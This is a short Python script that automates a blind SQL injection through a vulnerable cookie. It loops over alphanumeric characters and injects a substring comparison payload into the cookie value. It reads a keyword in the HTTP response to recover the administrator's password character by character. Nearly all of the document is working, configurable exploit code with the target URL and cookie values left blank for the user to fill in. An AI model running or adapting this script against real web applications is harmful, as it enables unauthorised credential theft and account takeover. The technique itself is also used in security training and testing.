'''
This script aims to exploit a blind SQL Injection vulnerability present in the cookie header to extract a user's password. 
In this scenario: 
    - We have identified that the 'users' table contains two attributes: 'username' and 'password 
    - Our goal is to extract the password of the administrator
    - The web communication between the client and the web server involves two cookies: 'injectable_cookie' (the vulnerable one) and the 'session' cookie 
    - When the values of both 'injectable_cookie' and 'session' are true, the web server responds with additional keywords 
    - Since it's a blind SQLi with a conditional response, we are going to rely on getting those keywords in the HTTP response text to determine the existance of a certain character in the administrator's password or not
    - The injection is realised through an HTTP GET request  

It's essential to note that all parameters mentioned above are configurable to match the database schema, cookies, and behavior of the target web application 

'''

import requests
import os

url = "" # The URL of the vulnerable endpoint. Ex: https://www.example.com/profile


'''
The ranges shown below are the ASCII decimal numbers of the uppercase & lowercase of the alphabet [A-Z, a-z] and the numbers [0-9]
The ranges can be expanded if wished to cover more ASCII characters 

'''
ascii_uppercase_alphabet_range=range(65,91)
ascii_lowercase_alphabet_range=range(97,123)
ascii_number_range=range(48,58)

combined_range=list(ascii_number_range) + list(ascii_uppercase_alphabet_range) + list(ascii_lowercase_alphabet_range)

'''
Below, the names & values of the cookies need to be filled
More cookie headers can be added depending on the web application 

'''

injectable_cookie=''
value_injectable_cookie=''

session_cookie=''
value_session_cookie=''

# Below is the initialization of the variables we'are going to use in the loop. These variables are for programming purposes only and need to stay the way they are 

keyword=''
password=''
j=1
the_end=True

print('Extracting password...')

while True:
    for i in combined_range:

        os.system('cls')

        password=password+f"{chr(i)}"

        print('Password:', password)

        payload= f"' and substring((select password from users where username='administrator'),{j},1)='{chr(i)}'--" # this SQL request can be customized depending on the database used by the web application 

        value_injected_cookie = value_injectable_cookie + payload 
     
        cookies={injectable_cookie:value_injected_cookie, session_cookie:value_session_cookie}

        response = requests.get(url, cookies=cookies)
        if ( keyword in response.text):
            the_end=False
            break
        else: 
            password=password[:-1]

    if the_end:
        break
    else: 
        the_end=True
        j=j+1
    

    





